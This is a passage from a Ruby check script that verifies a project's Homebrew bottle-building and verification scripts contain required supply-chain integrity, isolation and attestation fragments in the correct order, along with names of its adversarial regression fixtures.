    'TAP_RECIPE_METHOD = "kandelo_build_tap_recipe"',
    'TAP_RECIPE_MARKER = "KANDELO_TAP_RECIPE"',
    'tap recipe marker and canonical helper call must appear together',
    'canonical_nonnegative_integer_value = lambda do |node, lines|',
    'pkg_version_value = formula_revision.zero?',
    '"pkg_version" => pkg_version_value',
    'tap-recipe Formula pkg_version is invalid or oversized',
    '"manifest_sha256" => recipe_calls.first.fetch("manifest_sha256")',
    '"resources" => selected_resources',
    'tap-recipe Formula resource selection must be sorted and unique',
    'tap-recipe Formula selects resources without canonical literal URL and SHA-256',
    'tap-recipe Formula resource names collide in their environment keys',
    'tap-recipe Formula dependencies collide with resource variables',
    'script_env overrides resource variables',
    'declared_dependencies = declarations.filter_map',
    'tap_recipe["declared_dependencies"] = declared_dependencies',
    '"native_requirements" => native_requirements.sort_by { |entry| entry.fetch("class") }',
  ].each do |fragment|
    check(formula_closure.include?(fragment),
          "static Formula closure lacks immutable tap identity binding: #{fragment}")
  end
  tier2_plan_output = formula_closure[/elsif tier2_bridge_only(.*?)elsif bottle_identity_only/m, 1]
  check(tier2_plan_output&.include?('"schema" => tap_recipe.nil? ? 2 : 3') &&
        tier2_plan_output&.include?('plan["tap_recipe"] = tap_recipe unless tap_recipe.nil?') &&
        !tier2_plan_output&.include?('"schema" => 1'),
        "static Formula closure does not emit the exact bridge/recipe plan schema")
  tier2_preflight = File.read(
    File.join(REPO_ROOT, "tools/xtask/src/homebrew_tier2_preflight.rs")
  )
  [
    '"--tap-root is required for an active tap recipe"',
    "const MAX_BRIDGE_PLAN_BYTES: usize = 65_536;",
    '"Formula recipe dependencies differ from the Formula\'s declared target dependencies"',
    "resources: Vec<TapRecipeResource>",
    "pkg_version: String",
    "pkg_version: recipe.pkg_version.clone()",
    "validate_tap_recipe_pkg_version(&recipe.version, &recipe.pkg_version)?",
    '"WASM_POSIX_DEP_PKG_VERSION"',
    "resources: recipe.resources.clone()",
    "MAX_TAP_RECIPE_RESOURCES",
    "tap recipe resources must be sorted by unique name",
    "tap recipe resource names collide in environment key",
    "Formula recipe dependency and resource paths collide",
    "Formula recipe script_env_keys overrides resource path",
    '"Formula recipe tree differs from its manifest',
    '"Formula recipe tree must not contain symlinks',
    'fn validate_recipe_mode(value: &str) -> Result<u32, String>',
    '"0644" => Ok(0o644)',
    '"0755" => Ok(0o755)',
    'require_same_file(&before, &opened_after, path, label)?',
  ].each do |fragment|
    check(tier2_preflight.include?(fragment),
          "tap-recipe preflight trust boundary lacks #{fragment}")
  end
  host_dependency_plan_output = formula_closure[/elsif host_dependencies_only(.*?)elsif direct_only/m, 1]
  check(host_dependency_plan_output&.include?('"schema" => 4') &&
        host_dependency_plan_output&.include?('"native_requirements" => native_requirements'),
        "static Formula closure does not emit the sealed schema-4 native Requirement plan")
  check(!formula_closure.include?("legacy_requires") &&
        formula_closure.include?(
          "if runtime_initializer_index.nil? || runtime_assignment_index != runtime_initializer_index + 1"
        ),
        "Formula support API v1 does not require canonical Tier-2 runtime authority")
  [
    'TAP_ROOT="$(cd "$TAP_ROOT" && pwd -P)"',
    'homebrew_patched_launcher_isolate "$BUILD_USER"',
    'homebrew_patched_launcher_teardown "$BUILD_USER"',
    "homebrew_patched_launcher_verify_isolation",
    '"$WORK_DIR" "$KANDELO_ROOT" "$TAP_ROOT" "$OUT_DIR" "$KANDELO_ROOT"',
    "CI Formula execution requires KANDELO_HOMEBREW_BUILD_USER",
    'mktemp -d "$SHARED_TEMP/homebrew-build.XXXXXX"',
    'NATIVE_BASE="$(mktemp -d /tmp/k.XXXXXX)"',
    'NATIVE_BASE="$(cd "$NATIVE_BASE" && pwd -P)"',
    'NATIVE_BUILD_ROOT="$NATIVE_BASE"',
    'CONTROL_DIR="$(mktemp -d "$OUT_DIR/.control.XXXXXX")"',
    'chmod 0700 "$CONTROL_DIR"',
    'INSTALL_LOG="$CONTROL_DIR/brew-install.log"',
    'NATIVE_INSTALL_LOG="$CONTROL_DIR/native-brew-install.log"',
    'HOST_DEPENDENCY_PLAN="$CONTROL_DIR/host-dependencies.json"',
    'TARGET_BOTTLE_IDENTITY="$CONTROL_DIR/target-bottle-identity.json"',
    'HOST_DEPENDENCY_LIST="$CONTROL_DIR/host-dependencies.txt"',
    'DEPENDENCY_LIST="$CONTROL_DIR/same-tap-dependencies.txt"',
    'BUILD_TEST_DEPENDENCY_LIST="$CONTROL_DIR/same-tap-build-test-dependencies.txt"',
    'DEPENDENCY_POUR_LIST="$CONTROL_DIR/target-pour-dependencies.txt"',
    'ALLOWED_TARGET_TAPS="$CONTROL_DIR/allowed-target-taps.txt"',
    'STATIC_RUNTIME_DEPENDENCIES="$CONTROL_DIR/static-runtime-dependencies.txt"',
    'DEPENDENCY_CACHE_EVIDENCE="$CONTROL_DIR/dependency-cache-evidence.json"',
    'log="$CONTROL_DIR/brew-install-attempt-${attempt}.log"',
    'rm -rf "$CONTROL_DIR"',
    'unset HOMEBREW_KANDELO_BOTTLE_TAG KANDELO_HOMEBREW_BOTTLE_TAG',
    'unset HOMEBREW_KANDELO_PRIMARY_TAP_ROOT',
    'unset HOMEBREW_KANDELO_GNU_TAR',
    'HOMEBREW_KANDELO_GNU_TAR="$(command -v tar || true)"',
    'GNU_TAR_VERSION="$("$HOMEBREW_KANDELO_GNU_TAR" --version 2>/dev/null || true)"',
    '^/nix/store/[0-9a-z]{32}-gnutar-[^/]+/bin/tar$',
    'dev shell does not provide a protected Nix GNU tar',
    'export HOMEBREW_KANDELO_GNU_TAR',
    'run_brew_for_kandelo_bottles()',
    'HOMEBREW_KANDELO_BOTTLE_TAG="$BOTTLE_TAG"',
    'KANDELO_HOMEBREW_BOTTLE_TAG="$BOTTLE_TAG"',
    'run_brew_logged run_brew_for_kandelo_bottles "$BREW_BIN" install',
    "--include-build --include-test",
    'bash "$KANDELO_ROOT/scripts/homebrew-validate-host-dependency-plan.sh"',
    'jq -r \'.build_and_test[]\' "$HOST_DEPENDENCY_PLAN" >"$HOST_DEPENDENCY_LIST"',
    'TIER2_ATTESTATION="$CONTROL_DIR/tier2-attestation.json"',
    '(.schema == 2 or .schema == 3)',
    'keys == ["arch", "formula", "formula_sha256", "full_name", "schema", "support_runtime_sha256", "support_sha256", "tap", "tap_recipe", "tier2_bridge"]',
    '.tier2_bridge == null and .support_sha256 != null',
    '--repo-root "$KANDELO_ROOT" --tap-root "$TAP_ROOT" --arch "$ARCH"',
    '--repo-root "$KANDELO_ROOT" --tap-root "$TAPPED_TAP_ROOT" --arch "$ARCH"',
    'DEPENDENCY_TAP_ROOTS=()',
    'export HOMEBREW_KANDELO_PRIMARY_TAP_ROOT="$TAPPED_TAP_ROOT"',
    'homebrew_local_tap_clone_url "$dependency_root"',
    '"$BREW_BIN" tap "$dependency_tap" "$dependency_tap_clone_url"',
    'DEPENDENCY_TAP_ROOTS+=("$dependency_root")',
    '"${DEPENDENCY_TAP_ROOTS[@]}"',
    'filter_target_dependencies()',
    'Homebrew runtime dependency graph differs from the static locked-tap graph',
    'validate_dependency_list "$HOST_DEPENDENCY_LIST" "host dependency list"',
    'validate_dependency_list "$DEPENDENCY_LIST"',
    '"$BUILD_TEST_DEPENDENCY_LIST" "build/test dependency list"',
    'validate_dependency_list "$DEPENDENCY_POUR_LIST"',
    'done <"$DEPENDENCY_POUR_LIST"',
    'capture-cache',
    '--cache-root "$HOMEBREW_CACHE"',
    '--out "$DEPENDENCY_CACHE_EVIDENCE"',
    '--cache-evidence "$DEPENDENCY_CACHE_EVIDENCE"',
    'homebrew_patched_launcher_seal_target_dependencies',
    '"$BREW_BIN" list --formula "$dependency" >/dev/null',
    'target Homebrew rejected the native Formula proxy keg',
    '--expected-dependencies "$DEPENDENCY_LIST"',
    '"$BREW_BIN" install --build-bottle --ignore-dependencies',
    'homebrew_patched_launcher_snapshot_target_cellar_layout',
    'Formula test or bottle creation changed the planned target Cellar',
    'run_brew_for_kandelo_bottles "$BREW_BIN" bottle',
    '--bottle-identity-json',
    'Homebrew bottle rebuild $BOTTLE_REBUILD differs from planned Formula rebuild $EXPECTED_BOTTLE_REBUILD',
    'cp -p "$BOTTLE_SOURCE_JSON" "$OUT_DIR/bottles/"',
    'cp -p "${bottle_archives[0]}" "$OUT_DIR/bottles/"',
    "printf 'NATIVE_BUILD_ROOT=%q\\n' \"$NATIVE_BUILD_ROOT\"",
  ].each do |fragment|
    check(bottle_builder.include?(fragment), "reviewed bottle builder lacks #{fragment}")
  end
  retained_receipt_bottle_command = <<~'SHELL'.chomp
    run_brew_for_kandelo_bottles "$BREW_BIN" bottle \
        --json --keep-old --root-url "$BOTTLE_ROOT_URL" "$FORMULA_REF"
  SHELL
  check(bottle_builder.include?(retained_receipt_bottle_command) &&
        !bottle_builder.include?("--no-rebuild") &&
        !bottle_builder.match?(/bottle \\\n\s+--only-json-tab/),
        "reviewed bottle builder no longer retains its embedded installation receipt")
  host_plan_index = bottle_builder.index("--host-dependencies-json")
  native_install_index = bottle_builder.index(
    "homebrew_native_contract_install"
  )
  native_info_index = bottle_builder.index(
    "homebrew_patched_launcher_run_native info --json=v2"
  )
  native_missing_index = bottle_builder.index(
    "homebrew_native_contract_verify_no_missing_dependencies"
  )
  runtime_dependency_index = bottle_builder.index(
    'deps --topological --full-name --formula "$FORMULA_REF"'
  )
  build_test_dependency_index = bottle_builder.index(
    'deps --topological --full-name --include-build --include-test'
  )
  native_seal_index = bottle_builder.index("homebrew_patched_launcher_seal_native_prefix")
  native_bridge_index = bottle_builder.index("homebrew_patched_launcher_bridge_native_formula")
  native_proxy_index = bottle_builder.index(
    '"$BREW_BIN" list --formula "$dependency"'
  )
  dependency_pour_index = bottle_builder.index(
    'run_brew_logged run_brew_for_kandelo_bottles "$BREW_BIN" install'
  )
  dependency_cache_index = bottle_builder.index("  capture-cache")
  target_dependency_seal_index = bottle_builder.index(
    "homebrew_patched_launcher_seal_target_dependencies"
  )
  target_build_index = bottle_builder.index("  brew_install_build_bottle")
  check(host_plan_index && native_install_index && native_info_index &&
        native_missing_index && runtime_dependency_index && build_test_dependency_index &&
        native_seal_index && native_bridge_index && native_proxy_index &&
        dependency_pour_index && dependency_cache_index &&
        target_dependency_seal_index &&
        target_build_index &&
        host_plan_index < native_install_index &&
        native_install_index < native_info_index &&
        native_info_index < native_missing_index &&
        native_missing_index < runtime_dependency_index &&
        runtime_dependency_index < build_test_dependency_index &&
        build_test_dependency_index < native_seal_index &&
        native_seal_index < native_bridge_index &&
        native_bridge_index < native_proxy_index &&
        native_proxy_index < dependency_pour_index &&
        dependency_pour_index < dependency_cache_index &&
        dependency_cache_index < target_dependency_seal_index &&
        target_dependency_seal_index < target_build_index,
        "reviewed bottle builder mixes native and target dependency phases")
  check(!bottle_builder.include?("--only-dependencies"),
        "reviewed bottle builder lets target Homebrew resolve dependencies recursively")
  check(bottle_builder.include?("--force-bottle \\\n    --as-dependency \\\n    --ignore-dependencies") &&
        bottle_builder.include?(
          '"$BREW_BIN" install --build-bottle --ignore-dependencies'
        ), "reviewed bottle builder permits target dependency recursion")
  bottle_verifier = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-verify-poured-bottle.sh")
  )
  check(
    bottle_verifier.scan("homebrew_local_tap_clone_url").length == 2 &&
      bottle_verifier.include?(
        '"$BREW_BIN" tap "$TAP_NAME" "$PRIMARY_TAP_CLONE_URL"'
      ) &&
      bottle_verifier.include?(
        '"$BREW_BIN" tap "$dependency_tap" ' \
        '"$dependency_tap_clone_url"'
      ) &&
      !bottle_verifier.include?(
        '"$BREW_BIN" tap "$TAP_NAME" "$TAP_ROOT"'
      ) &&
      !bottle_verifier.include?(
        '"$BREW_BIN" tap "$dependency_tap" "$dependency_root"'
      ),
    "bottle verifier local tap clones can share Git object inodes"
  )
  [
    '--sysroot-build-root) SYSROOT_BUILD_ROOT=',
    'SYSROOT_BUILD_ROOT OUT; do',
    'sysroot build root must be a real directory',
    'SYSROOT_BUILD_ROOT="$(cd "$SYSROOT_BUILD_ROOT" && pwd -P)"',
    '"$WORK_DIR" "$KANDELO_ROOT" "$TAP_ROOT" "$OUT_PARENT" "$SYSROOT_BUILD_ROOT"',
  ].each do |fragment|
    check(bottle_verifier.include?(fragment),
          "reviewed bottle verifier protected sysroot contract lacks #{fragment}")
  end
  verifier_checker_derivation_index = bottle_verifier.index(
    'XTASK_BIN="$KANDELO_ROOT/target/$HOST_TARGET/release/xtask"'
  )
  verifier_checker_match_index = bottle_verifier.index(
    '[ "${WASM_POSIX_XTASK_BIN:-}" != "$XTASK_BIN" ]',
    verifier_checker_derivation_index || 0
  )
  verifier_checker_export_index = bottle_verifier.index(
    "export WASM_POSIX_XTASK_BIN", verifier_checker_match_index || 0
  )
  verifier_checker_isolate_index = bottle_verifier.index(
    'homebrew_patched_launcher_isolate "$BUILD_USER"',
    verifier_checker_export_index || 0
  )
  check(verifier_checker_derivation_index && verifier_checker_match_index &&
        verifier_checker_export_index && verifier_checker_isolate_index &&
        verifier_checker_derivation_index < verifier_checker_match_index &&
        verifier_checker_match_index < verifier_checker_export_index &&
        verifier_checker_export_index < verifier_checker_isolate_index &&
        bottle_verifier.include?(
          "scoped program-index checker differs from the exact host xtask"
        ),
        "reviewed bottle verifier does not bind the scoped checker to its host target")
  [
    'PROVENANCE_TAP_ROOT="$(jq -er --arg tap "$TAP_NAME"',
    'select(.tap_name == $tap)',
    'select(type == "string" and startswith("/"))',
    '--tap-root "$PROVENANCE_TAP_ROOT"',
    '--dependency-tap-root "$PROVENANCE_TAP_ROOT"',
  ].each do |fragment|
    check(bottle_verifier.include?(fragment),
          "reviewed bottle verifier clean provenance tap binding lacks #{fragment}")
  end
  provenance_capture = bottle_verifier.index(
    "dependency_provenance_args=("
  )
  clean_provenance_root = bottle_verifier.index(
    '--tap-root "$PROVENANCE_TAP_ROOT"', provenance_capture || 0
  )
  check(provenance_capture && clean_provenance_root,
        "reviewed bottle verifier captures provenance from its reconstructed dirty tap")
  formula_test_contract_index = bottle_verifier.index(
    "--bottle-test-contract-json"
  )
  formula_test_index = bottle_verifier.index(
    'run_brew_logged "$BREW_BIN" test "$FORMULA_REF"'
  )
  formula_test_evidence_index = bottle_verifier.index(
    'case "$FORMULA_TEST_CONTRACT" in', formula_test_index || 0
  )
  runtime_evidence_capture_index = bottle_verifier.index(
    'homebrew-bottle-runtime-evidence.py" capture'
  )
  [
    "node|support-data",
    "brew test did not emit Node execution evidence",
    "support-data brew test unexpectedly emitted Node execution evidence",
    '[ -L "$HOMEBREW_KANDELO_NODE_RECEIPT_PATH" ]',
    '--cache-root "$HOMEBREW_CACHE"',
  ].each do |fragment|
    check(bottle_verifier.include?(fragment),
          "reviewed bottle verifier weakens typed Formula test evidence: #{fragment}")
  end
  check(formula_test_contract_index && formula_test_index &&
        formula_test_evidence_index && runtime_evidence_capture_index &&
        formula_test_contract_index < formula_test_index &&
        formula_test_index < formula_test_evidence_index &&
        formula_test_evidence_index < runtime_evidence_capture_index,
        "reviewed bottle verifier derives or checks its static test contract out of order")
  check(!bottle_verifier.include?('SYSROOT_BUILD_ROOT="${KANDELO_ROOT') &&
        !bottle_verifier.include?('SYSROOT_BUILD_ROOT="$KANDELO_ROOT"'),
        "reviewed bottle verifier falls back to the pristine source checkout for its sysroot")
  publisher_isolation_patch_path =
    "homebrew/patches/0002-support-isolated-publisher.patch"
  publisher_isolation_patch = File.read(File.join(REPO_ROOT, publisher_isolation_patch_path))
  publisher_isolation_patch_header =
    publisher_isolation_patch.split(/^---$/, 2).first.gsub(/\s+/, " ")
  platform_patch = File.read(
    File.join(REPO_ROOT, "homebrew/patches/0001-add-kandelo-wasm-bottle-tags.patch")
  )
  native_install_contract = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-native-install-contract.sh")
  )
  native_contract_paths = %w[
    scripts/homebrew-native-api-contract.rb
    scripts/homebrew-native-api-preflight.sh
    scripts/homebrew-native-bounded-environment.sh
    scripts/homebrew-native-check-brew-source.sh
    scripts/homebrew-native-command-diagnostic.rb
    scripts/homebrew-native-install-contract.sh
    scripts/update-homebrew-native-compatibility-lock.sh
    homebrew/homebrew-native-compatibility-roots.json
    homebrew/homebrew-native-compatibility-lock.json
  ]
  native_contract_paths.each do |relative|
    path = File.join(REPO_ROOT, relative)
    check(File.file?(path) && !File.symlink?(path),
          "native Homebrew contract input is not a regular file: #{relative}")
  end
  %w[
    scripts/homebrew-native-api-preflight.sh
    scripts/homebrew-native-check-brew-source.sh
    scripts/update-homebrew-native-compatibility-lock.sh
  ].each do |relative|
    check((File.stat(File.join(REPO_ROOT, relative)).mode & 0o111).positive?,
          "native Homebrew contract entry point is not executable: #{relative}")
  end
  native_api_oracle = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-native-api-contract.rb")
  )
  [
    "Homebrew::API.fetch_api_files!",
    "Homebrew::API::Formula.all_formulae",
    "Homebrew::API::Internal.formula_hashes",
    "Homebrew::API::Internal.write_formula_names_and_aliases",
    "signed Homebrew API sources disagree on the core revision",
    "signed API changed selected Formula",
    "compatibility lock has unexpected fields",
    "kandelo-homebrew-native-source-attestation",
    "ignored portable Ruby changed during attestation",
    "native Cellar escaped the admitted closure",
    'receipt["loaded_from_internal_api"] == true',
    'receipt["poured_from_bottle"] == true',
    'receipt.dig("source", "tap") == "homebrew/core"',
    "kandelo-homebrew-native-overlay-attestation",
    "native overlay attestation has unexpected fields",
    "native overlay attestation names another repository",
    "native overlay attestation changed while reading",
  ].each do |fragment|
    check(native_api_oracle.include?(fragment),
          "native Homebrew API oracle lacks #{fragment}")
  end
  protected_git_contract = native_api_oracle[
    /def current_brew_commit\n(.*?)\nend\n\ndef validate_overlay_attestation/m,
    1
  ]
  check(protected_git_contract,
        "native Homebrew API oracle lost its trusted protected-Git check")
  [
    "Utils.safe_popen_read(",
    '"GIT_CONFIG_NOSYSTEM" => "1"',
    '"GIT_CONFIG_GLOBAL" => File::NULL',
    '"GIT_CONFIG_COUNT" => "1"',
    '"GIT_CONFIG_KEY_0" => "safe.directory"',
    '"GIT_CONFIG_VALUE_0" => repository',
    '"GIT_NO_REPLACE_OBJECTS" => "1"',
    '"GIT_OPTIONAL_LOCKS" => "0"',
    '"rev-parse", "--verify", "HEAD^{commit}"',
    "cannot verify Homebrew checkout with protected Git",
  ].each do |fragment|
    check(protected_git_contract.include?(fragment),
          "trusted native Homebrew Git check lacks #{fragment}")
  end
  check(!protected_git_contract.include?('safe.directory=*'),
        "native Homebrew API oracle authorizes every Git checkout")
  overlay_attestation_contract = native_api_oracle[
    /def validate_overlay_attestation\(path, expected_commit\)\n(.*?)\nend\n\ndef check_brew_commit/m,
    1
  ]
  check(overlay_attestation_contract,
        "native Homebrew API oracle lost its sealed-overlay attestation validator")
  overlay_attestation_keys = overlay_attestation_contract[
    /expected_keys = %w\[\n(.*?)\n  \]/m,
    1
  ]&.split
  check(overlay_attestation_keys == %w[
          homebrew_commit
          homebrew_tree
          kind
          overlay_state_sha256
          repository
          schema
        ], "native overlay attestation schema is not the exact flat six-key contract")
  [
    "expected_keys = %w[",
    "homebrew_commit",
    "homebrew_tree",
    "kind",
    "overlay_state_sha256",
    "repository",
    "schema",
    'attestation.keys.sort == expected_keys',
    'attestation["schema"] == 1',
    '"kandelo-homebrew-native-overlay-attestation"',
    'before.nlink == 1',
    '(before.mode & 0o777) == 0o444',
    'attestation["repository"] == repository.to_s',
    'attestation["homebrew_commit"] == expected_commit',
  ].each do |fragment|
    check(overlay_attestation_contract.include?(fragment),
          "sealed native overlay attestation validator lacks #{fragment}")
  end
  check(!overlay_attestation_contract.match?(
          /Utils\.safe_popen_read|safe\.directory|rev-parse/
        ), "isolated native overlay attestation validation still invokes Git")
  brew_commit_contract = native_api_oracle[
    /def check_brew_commit\(expected, overlay_attestation = nil\)\n(.*?)\nend\n\ndef with_target_api/m,
    1
  ]
  check(brew_commit_contract &&
        brew_commit_contract.include?(
          "validate_overlay_attestation(overlay_attestation, expected)"
        ) && brew_commit_contract.include?("actual = current_brew_commit") &&
        brew_commit_contract.index("validate_overlay_attestation") <
          brew_commit_contract.index("actual = current_brew_commit"),
        "native Homebrew commit check does not separate sealed admission from trusted Git")
  prime_command = native_api_oracle[/when "prime"\n(.*?)\nwhen "recheck"/m, 1]
  recheck_command = native_api_oracle[/when "recheck"\n(.*?)\nwhen "audit-cellar"/m, 1]
  audit_cellar_command = native_api_oracle[
    /when "audit-cellar"\n(.*?)\nwhen "admit", "generate-lock"/m,
    1
  ]
  admit_and_lock_command = native_api_oracle[
    /when "admit", "generate-lock"\n(.*?)\nelse\n  fail_contract/m,
    1
  ]
  check(prime_command&.include?("check_brew_commit(expected_commit)") &&
        recheck_command&.include?("check_brew_commit(expected_commit)"),
        "native prime or recheck no longer verifies trusted outer Git")
  check(audit_cellar_command&.include?(
          "check_brew_commit(expected_commit, overlay_attestation)"
        ) && audit_cellar_command.include?(
          "unless [5, 6].include?(ARGV.length)"
        ) && !audit_cellar_command.match?(
          /Utils\.safe_popen_read|safe\.directory|rev-parse/
        ), "isolated native Cellar audit does not consume the overlay attestation")
  check(admit_and_lock_command&.include?(
          'overlay_attestation = ARGV.shift if mode == "admit"'
        ) && admit_and_lock_command.include?(
          "check_brew_commit(expected_commit, overlay_attestation)"
        ) && admit_and_lock_command.include?(
          'valid_lengths = mode == "admit" ? [8, 9] : [6]'
        ) && admit_and_lock_command.scan("overlay_attestation =").length == 1,
        "native admission and trusted lock generation lost their distinct identity sources")
  production_native_install = native_install_contract[
    /homebrew_native_contract_install\(\) \{\n(.*?)\n\}\n\nhomebrew_native_contract_verify_no_missing_dependencies/m,
    1
  ]
  check(production_native_install,
        "native Homebrew install lost its signed admission contract")
  [
    'overlay_attestation="${HOMEBREW_PATCHED_NATIVE_OVERLAY_ATTESTATION:-}"',
    '[ -f "$overlay_attestation" ] && [ ! -L "$overlay_attestation" ]',
    '"sealed native Homebrew identity is unavailable"',
    'admit "$brew_commit" "$overlay_attestation" "$policy"',
    'audit-cellar "$brew_commit" "$overlay_attestation" "$prime"',
  ].each do |fragment|
    check(production_native_install.include?(fragment),
          "production native Homebrew install lacks #{fragment}")
  end
  attestation_selection_index = production_native_install.index(
    'overlay_attestation="${HOMEBREW_PATCHED_NATIVE_OVERLAY_ATTESTATION:-}"'
  )
  dependency_resolution_index = production_native_install.index(
    "signed-api-dependency-resolution"
  )
  admission_index = production_native_install.index(
    'admit "$brew_commit" "$overlay_attestation"'
  )
  cellar_audit_index = production_native_install.index(
    'audit-cellar "$brew_commit" "$overlay_attestation"'
  )
  check(attestation_selection_index && dependency_resolution_index &&
        admission_index && cellar_audit_index &&
        attestation_selection_index < dependency_resolution_index &&
        dependency_resolution_index < admission_index &&
        admission_index < cellar_audit_index,
        "production native install does not bind its sealed overlay identity before admission")
  check(!production_native_install.include?('admit "$brew_commit" "$policy"') &&
        !production_native_install.include?('audit-cellar "$brew_commit" "$prime"'),
        "production native install can invoke isolated admission without its attestation")
  native_api_preflight = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-native-api-preflight.sh")
  )
  [
    '. "$SCRIPT_DIR/homebrew-native-bounded-environment.sh"',
    'jq -e --arg purpose "$purpose" --rawfile text "$roots"',
    "Homebrew API cache is group- or world-writable",
    "cache directory must not already exist",
    "state directory must not already exist",
    "Prime does the only network fetch",
    '"$sudo_bin" -n chown -R root:root "$api_root"',
    "recheck",
    'printf \'%s\\n\' empty >"$state_root/mode"',
  ].each do |fragment|
    check(native_api_preflight.include?(fragment),
          "native Homebrew API preflight lacks #{fragment}")
  end
  native_bounded_environment = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-native-bounded-environment.sh")
  )
  [
    "api-client|api-compatibility-lock|api-oracle",
    '"HOMEBREW_FORCE_LIBC_FORMULA=1"',
    '"HOMEBREW_FORCE_COMPILER_FORMULA=1"',
    '"HOMEBREW_RELOCATE_BUILD_PREFIX=1"',
  ].each do |fragment|
    check(native_bounded_environment.include?(fragment),
          "native Homebrew bounded environment lacks #{fragment}")
  end
  native_lock_updater = File.read(
    File.join(REPO_ROOT, "scripts/update-homebrew-native-compatibility-lock.sh")
  )
  [
    '[ "$(uname -s)" = "Linux" ]',
    '[ "$(uname -m)" = "x86_64" ]',
    'SOURCE_CHECK="$SCRIPT_DIR/homebrew-native-check-brew-source.sh"',
    '. "$SCRIPT_DIR/homebrew-native-bounded-environment.sh"',
    'SOURCE_PRISTINE="$WORK/source-pristine.json"',
    ".ignored_runtime.present == false",
    'NATIVE_PREFIX="$WORK/native-prefix"',
    'NATIVE_BREW="$NATIVE_PREFIX/bin/brew"',
    'ln -s "$BREW_REPOSITORY/bin/brew" "$NATIVE_BREW"',
    '"$NATIVE_BREW" "$CACHE" "$STATE"',
    ".ignored_runtime.present == true",
    '"$SOURCE_BEFORE"',
    '"$SOURCE_AFTER"',
    'cmp -s "$SOURCE_BEFORE" "$SOURCE_AFTER"',
    "homebrew_native_bounded_run",
    "api-compatibility-lock",
    "deps --union --include-implicit --full-name --formula",
  ].each do |fragment|
    check(native_lock_updater.include?(fragment),
          "native Homebrew compatibility-lock updater lacks #{fragment}")
  end
  native_source_check = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-native-check-brew-source.sh")
  )
  [
    "clean_git()",
    "/usr/bin/env -i",
    "GIT_NO_REPLACE_OBJECTS=1",
    'RESOLVED_BREW="$(readlink -f -- "$BREW_BIN")"',
    'BREW_REPOSITORY="${RESOLVED_BREW%/bin/brew}"',
    'clean_git -C "$BREW_REPOSITORY" rev-parse --show-toplevel',
    'clean_git -C "$BREW_REPOSITORY" rev-parse HEAD',
    'readlink -f -- "$BREW_BIN"',
    "brew executable is outside the reviewed checkout",
    "brew checkout index has nonordinary entries",
    "brew checkout has source-affecting local Git configuration",
    "brew checkout has Git replacement refs",
    "brew checkout has legacy Git grafts",
    "brew checkout has unreviewed ignored state",
    "tracked_tree_manifest",
    "ls-tree -r -t -z --full-tree",
    "attest-source",
    "status --porcelain=v1",
    "brew checkout is not clean",
  ].each do |fragment|
    check(native_source_check.include?(fragment),
          "native Homebrew source checker lacks #{fragment}")
  end
  native_contract_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-native-api-contract.sh")
  )
  native_command_diagnostic = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-native-command-diagnostic.rb")
  )
  [
    "MAX_CAPTURE_BYTES = 16 * 1024",
    "MAX_RENDERED_LINES = 200",
    "File::NOFOLLOW",
    "File::CREAT | File::EXCL | File::NOFOLLOW",
    'fail_diagnostic("capture expects PATH")',
    "diagnostic log is not a private regular file",
    "[redacted-github-token]",
    'puts "| #{line}"',
  ].each do |fragment|
    check(native_command_diagnostic.include?(fragment),
          "native Homebrew command diagnostic lacks #{fragment}")
  end
  publisher_contract_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-publish-workflow.sh")
  )
  check(publisher_contract_test.include?(
          'bash "$REPO_ROOT/scripts/test-homebrew-native-api-contract.sh"'
        ), "publisher regression suite omits the native API contract")
  [
    "public-only unused drift",
    "internal-only unused drift",
    "same-head unrelated drift",
    "public-only selected Formula drift",
    "internal-only selected Formula drift",
    "signed source disagreement",
    "API symlink",
    "sealed API mutation",
    "CI test-owner exception",
    "occupied attestation output",
    "zero-root preflight fetched or invented signed API state",
    "CI fallback without signed API state",
    "dirty Brew worktree",
    "staged Brew worktree",
    "untracked Brew worktree",
    "assume-unchanged Brew index",
    "skip-worktree Brew index",
    "source-affecting local Git config",
    "Git replacement refs",
    "legacy Git grafts",
    "checkout-transforming Git config",
    "raw tracked source transformation",
    "raw tracked symlink target",
    "raw tracked executable mode",
    "unreviewed ignored Brew state",
    "unreviewed empty ignored Brew directory",
    "direct Brew prefix lock leakage",
    "isolated Brew prefix",
    "compatibility lock did not force its conservative host closure",
    "portable Ruby attestation",
    "escaping portable Ruby symlink",
    "wrong Brew commit",
    "wrapped Brew executable",
    "exercise_native_install_stage",
    "deps 51 signed-api-dependency-resolution",
    "admit 52 signed-api-admission",
    "audit 53 installed-cellar-audit-1",
    "large native diagnostic was not bounded around its useful tail",
    "failed capture appended or rendered stale diagnostic bytes",
    "missing per-command log did not fail closed",
    "symlink per-command log was followed",
    "native command diagnostic was not inert and credential-safe",
    "exercise_installed_formula_metadata_failure",
    "installed-formula-metadata failed with status 55",
    "errexit caller did not exit with the native command status",
    "successful native diagnostic did not restore caller errexit",
    "direct publisher boundary suppressed an unguarded inner failure",
    "publisher boundary discarded stateful function changes",
  ].each do |fragment|
    check(native_contract_test.include?(fragment),
          "native Homebrew adversarial fixture lacks #{fragment}")
  end
  roots_policy = JSON.parse(File.read(
    File.join(REPO_ROOT, "homebrew/homebrew-native-compatibility-roots.json")
  ))
  check(roots_policy.keys.sort ==
          %w[architecture homebrew_commit kind roots schema] &&
        roots_policy["schema"] == 1 &&
        roots_policy["kind"] == "kandelo-homebrew-native-roots" &&
        roots_policy["architecture"] == "x86_64_linux" &&
        roots_policy["homebrew_commit"] == BREW_COMMIT,
        "native Homebrew root policy envelope changed")
  compatibility_lock = JSON.parse(File.read(
    File.join(REPO_ROOT, "homebrew/homebrew-native-compatibility-lock.json")
  ))
  check(compatibility_lock.keys.sort ==
          %w[architecture formulae homebrew_commit kind schema] &&
        compatibility_lock["schema"] == 1 &&
        compatibility_lock["kind"] ==
          "kandelo-homebrew-native-compatibility-lock" &&
        compatibility_lock["architecture"] == "x86_64_linux" &&
        compatibility_lock["homebrew_commit"] == BREW_COMMIT &&
        compatibility_lock["formulae"].is_a?(Hash),
        "native Homebrew compatibility lock envelope changed")
  conservative_linux_bootstrap = %w[
    binutils
    gcc
    glibc
    gmp
    isl
    libmpc
    linux-headers@6.8
    mpfr
  ]
